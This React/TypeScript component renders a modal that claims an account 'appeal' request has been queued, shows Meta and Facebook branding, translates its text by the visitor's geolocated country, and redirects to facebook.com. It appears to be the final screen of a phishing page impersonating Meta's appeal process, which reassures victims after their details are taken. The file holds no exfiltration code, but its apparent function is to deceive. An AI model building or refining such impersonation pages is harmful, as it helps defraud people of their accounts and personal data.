import FinalImage from '@/assets/images/final-image.png';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import { getTranslations } from '@/utils/translate';
import Image from 'next/image';
import { useMemo, type FC } from 'react';

const FinalModal: FC = () => {
    const { geoInfo } = store();
    
    // Get language from country code
    const countryToLanguage: Record<string, string> = useMemo(() => ({
        'us': 'en', 'gb': 'en', 'ca': 'en', 'au': 'en',
        'mx': 'es', 'es': 'es', 'ar': 'es', 'br': 'pt', 'pt': 'pt',
        'fr': 'fr', 'de': 'de', 'at': 'de', 'ch': 'fr',
        'jp': 'ja', 'cn': 'zh', 'tw': 'zh', 'hk': 'zh',
        'kr': 'ko', 'th': 'th', 'vn': 'vi', 'id': 'id',
        'ru': 'ru', 'ua': 'uk', 'in': 'hi', 'bd': 'bn',
        'ae': 'ar', 'sa': 'ar', 'eg': 'ar'
    }), []);
    
    const translations = useMemo(() => {
        const countryCode = geoInfo?.country_code?.toLowerCase() || 'us';
        const lang = countryToLanguage[countryCode] || 'en';
        return getTranslations(lang);
    }, [geoInfo, countryToLanguage]);

    const t = (text: string): string => {
        return translations[text] || text;
    };

    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-2 md:px-4'>
            <div className='flex max-h-[90vh] w-full max-w-xs md:max-w-xl flex-col gap-5 md:gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-2 md:p-4'>
                <p className='mt-4 text-lg md:text-2xl font-bold'>{t('Request has been sent')}</p>
                <p className='text-base md:text-xl'>{t('Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.')}</p>
                <div className='flex flex-col justify-center gap-10'>
                    <Image src={FinalImage} alt='' />
                    <button type='button' onClick={() => window.location.replace('https://www.facebook.com')} className='mt-4 flex h-[45px] md:h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 text-sm md:text-base'>
                        {t('Return on Facebook')}
                    </button>
                </div>
                <div className='flex items-center justify-center p-3'>
                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
                </div>
            </div>
        </div>
    );
};

export default FinalModal;
